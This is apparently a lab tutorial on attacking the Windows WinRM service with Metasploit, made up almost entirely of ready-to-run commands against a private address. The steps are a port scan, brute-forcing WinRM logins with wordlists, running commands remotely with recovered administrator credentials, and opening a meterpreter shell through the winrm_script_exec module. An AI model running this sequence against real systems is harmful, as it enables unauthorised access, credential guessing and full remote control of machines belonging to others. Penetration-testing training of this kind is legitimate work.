# WinRM: Exploitation with Metasploit

Windows Exploitation: Services

Nmap

```bash
nmap --top-ports 7000 10.0.0.173
```

msfconsole

```bash
msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 10.0.0.173
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
exploit
```

Checking WinRM supported authentication method using an auxiliary module.

```bash
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS 10.0.0.173
exploit
```

Execute command on the target server using winrm\_cmd module.

```bash
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS 10.0.0.173
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit
```

We have successfully executed the command "whoami" on the remote server. Now, we

will use the winrm\_exec exploit module to get the meterpreter shell.

```bash
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 10.0.0.173
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit
```

